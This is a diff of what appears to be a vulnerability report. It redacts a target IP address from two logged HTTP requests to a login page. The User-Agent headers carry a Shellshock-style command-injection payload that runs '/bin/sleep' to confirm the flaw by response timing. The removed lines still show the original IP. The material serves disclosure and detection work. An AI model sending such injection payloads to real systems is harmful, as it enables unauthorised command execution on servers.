@@ -6,14 +6,14 @@ In the initial test, when the payload was set to sleep for 0 milliseconds, the s
 
 # <strong>Request #1 (0ms)</strong></br>
 GET /login/?next=/ HTTP/1.1</br>
-Host: 187.202.248.194:8808</br>
+Host: *.*.*.*:8808</br>
 Accept-Encoding: gzip, deflate, br</br>
 Accept: */*</br>
 Accept-Language: en-US;q=0.9,en;q=0.8</br>
 User-Agent: () { _; } >_[$$($$())] { /bin/sleep 0; }</br>
 Connection: close</br>
 Cache-Control: max-age=0</br>
-Referer: http://187.202.248.194:8808/</br>
+Referer: http://*.*.*.*:8808/</br>
 
 # <strong>Response #1 (0ms)</strong></br>
 HTTP/1.1 200 OK</br>
@@ -31,14 +31,14 @@ Connection: close</br>
 
 # <strong>Request #2 (4000ms)</strong></br>
 GET /login/?next=/ HTTP/1.1</br>
-Host: 187.202.248.194:8808</br>
+Host: *.*.*.*:8808</br>
 Accept-Encoding: gzip, deflate, br</br>
 Accept: */*</br>
 Accept-Language: en-US;q=0.9,en;q=0.8</br>
 User-Agent: () { _; } >_[$$($$())] { /bin/sleep 4; }</br>
 Connection: close</br>
 Cache-Control: max-age=0</br>
-Referer: http://187.202.248.194:8808/</br>
+Referer: http://*.*.*.*:8808/</br>
 
 # <strong>Response #2 (4000ms)</strong></br>
 HTTP/1.1 200 OK</br>
